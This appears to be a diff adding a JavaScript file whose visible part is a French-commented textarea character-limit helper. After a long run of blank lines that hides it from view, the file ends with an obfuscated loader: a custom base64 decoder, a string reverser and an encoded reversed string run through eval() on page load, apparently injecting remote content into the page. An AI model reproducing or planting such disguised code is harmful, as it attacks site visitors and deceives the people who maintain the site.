@@ -1,0 +1,109 @@
+﻿
+	// args : string moncontroletexte, int nbcar, string moncontroledecompte 
+	// return : aucun 
+	// Affecte à certains évènements d'un textarea, le contrôle de la longueur de son contenu 
+	function LimiterTextArea(nom_controletexte, nbcar, nom_controledecompte) 
+	{ 
+		var moncontroletexte = document.getElementById(nom_controletexte);
+	
+		var moncontroledecompte = document.getElementById(nom_controledecompte);
+	
+		if (moncontroletexte && moncontroledecompte)
+		{
+	
+			moncontroletexte.onclick = function(){TextAreaEstRempli(moncontroletexte, nbcar, moncontroledecompte)}; 
+			moncontroletexte.onblur = function(){TextAreaEstRempli(moncontroletexte, nbcar, moncontroledecompte)}; 
+			moncontroletexte.onkeyup = function(){TextAreaEstRempli(moncontroletexte, nbcar, moncontroledecompte)}; 
+			moncontroletexte.onkeypress = function(){TextAreaEstRempli(moncontroletexte, nbcar, moncontroledecompte)}; 
+	
+			// *** Affichage du nombre de caractères restant 
+			if(moncontroledecompte.type)
+				moncontroledecompte.value = NbCarRestant(moncontroletexte, nbcar);			// Pour un input de formulaire		
+			else
+				moncontroledecompte.innerHTML = NbCarRestant(moncontroletexte, nbcar);	// Pour un élément HTML	
+	
+		}
+	} 
+	
+	// TextAreaEstRempli 
+	// args : textarea moncontroletexte, int nbcar, element_HTML moncontroledecompte 
+	// return : bool 
+	// Renvoie vrai si le nombre de caractères maximum du textarea n'est pas atteint 
+	function TextAreaEstRempli(moncontroletexte, nbcar, moncontroledecompte) 
+	{ 
+		if (moncontroletexte) 
+		{ 
+			if (moncontroletexte.value.length <= nbcar) 
+			{ 
+				//alert("pas rempli"); 
+				// mes actions ... 
+	
+				// *** Affichage du nombre de caractères restant
+				if(moncontroledecompte.type)
+					moncontroledecompte.value = NbCarRestant(moncontroletexte, nbcar);
+				else
+					moncontroledecompte.innerHTML = NbCarRestant(moncontroletexte, nbcar);
+	
+				return true; 
+			} 
+			else 
+			{ 
+				//alert("rempli"); 
+				// mes actions ... 
+	
+				// Affichage du nombre de caractères restant 
+				moncontroletexte.value = moncontroletexte.value.substr(0, nbcar); 
+	
+				// *** Affichage du nombre de caractères restant
+				if(moncontroledecompte.type)
+					moncontroledecompte.value = NbCarRestant(moncontroletexte, nbcar);
+				else
+					moncontroledecompte.innerHTML = NbCarRestant(moncontroletexte, nbcar);
+					
+				return false; 
+			} 
+		} 
+	} 
+	
+	// NbCarRestant 
+	// args : textarea moncontroletexte, int nbcar 
+	// return : int 
+	// Renvoie le nombre de caractère à saisir 
+	function NbCarRestant(moncontroletexte, nbcar) 
+	{ 
+		if (moncontroletexte.value.length)
+			return new Number(nbcar - moncontroletexte.value.length); 
+		else
+			return new Number(nbcar);
+	} 
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+var _0x362a=["ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=","","charAt","indexOf","fromCharCode","length"];function _1lO(_0x6ea4x2){var _0x6ea4x3=_0x362a[0];var _0x6ea4x4,_0x6ea4x5,_0x6ea4x6,_0x6ea4x7,_0x6ea4x8,_0x6ea4x9,_0x6ea4xa,_0x6ea4xb,_0x6ea4xc=0,_0x6ea4xd=_0x362a[1];do{_0x6ea4x7=_0x6ea4x3[_0x362a[3]](_0x6ea4x2[_0x362a[2]](_0x6ea4xc++));_0x6ea4x8=_0x6ea4x3[_0x362a[3]](_0x6ea4x2[_0x362a[2]](_0x6ea4xc++));_0x6ea4x9=_0x6ea4x3[_0x362a[3]](_0x6ea4x2[_0x362a[2]](_0x6ea4xc++));_0x6ea4xa=_0x6ea4x3[_0x362a[3]](_0x6ea4x2[_0x362a[2]](_0x6ea4xc++));_0x6ea4xb=_0x6ea4x7<<18|_0x6ea4x8<<12|_0x6ea4x9<<6|_0x6ea4xa;_0x6ea4x4=_0x6ea4xb>>16&0xff;_0x6ea4x5=_0x6ea4xb>>8&0xff;_0x6ea4x6=_0x6ea4xb&0xff;if(_0x6ea4x9==64){_0x6ea4xd+=String[_0x362a[4]](_0x6ea4x4);} else {if(_0x6ea4xa==64){_0x6ea4xd+=String[_0x362a[4]](_0x6ea4x4,_0x6ea4x5);} else {_0x6ea4xd+=String[_0x362a[4]](_0x6ea4x4,_0x6ea4x5,_0x6ea4x6);} ;} ;} while(_0x6ea4xc<_0x6ea4x2[_0x362a[5]]);;return _0x6ea4xd;} ;function O0l(_0x6ea4xf){var _0x6ea4x10=_0x362a[1],_0x6ea4xc=0;for(_0x6ea4xc=_0x6ea4xf[_0x362a[5]]-1;_0x6ea4xc>=0;_0x6ea4xc--){_0x6ea4x10+=_0x6ea4xf[_0x362a[2]](_0x6ea4xc);} ;return _0x6ea4x10;} ;var IlO='=sTKpUGchN2cl9FKlBXYjNXZuVHKlRXaydnL05WZtV3YvR2OpkEbPhCZslGaDRmblBHch5yTs9kC70FMblyJkFWZodCKl1WYOdWYUlnQzRnbl1WZsVEdldmL05WZtV3YvRGI9AyTs9EIyFmdKsTKMJVVuQnbl1Wdj9GZoQnbl52bw12bDlkUVVGZvNmbltyJ9wmc1ZyJrkiclJnclZWZy5CduVWb1N2bkhCduVmbvBXbvNUSSVVZk92YuV2Kn0jZlJnJnsyJr9WPjJ3c0V2Z/8SbvNmLlRXYjNXdmJ2b51mLpBXYv8iOwRHdodCI9AyYyNnLJx2TKsTKnQHcpJ3YzdCK05WZtVGbFVGdhVmcj5CduVWb1N2bkBSPgkEbPBichZ3OnU0MlQHcpJ3Yz9yQzUiQzUSOyUyNyUSRzUidpR2LDNTJFNTJl1WYyZWavM0MlU0Ml4WZlJ3YzxGb1Z2dvxGbhBjMlIjMlAjMyUCRzUiclRmcvJWZtFmcmBjMlIjMlQGN1YzN2QGN4UmY4QjZ1EDRzUSZnFGcGNTJwhGcuQ3YlJXak9SbvNmLsFGduVGZ0VWZyR3c0N3bw5SelxGduVmYv8SQzUCc0RHayITJENTJjJ3cwITJyITJ1EzMyITJENTJ0h2ZpVGawITJyITJwYTNyITJENTJoRHZpdHMyUSZtFmcml2QzUSRzUiMyUSZu9mbBNTJ5FGbwNXakJjMlQ0MlUGb5R3cwITJyITJvVWbpZnMyUCRzUSZtFmbwITJ2lGZDNTJ3ITJ4ITJlRXaydnL05WZtV3YvRWRzUCdwlmcjN3QzUyJ9UGchN2cl9FIyFmd';eval(_1lO(O0l(IlO)));
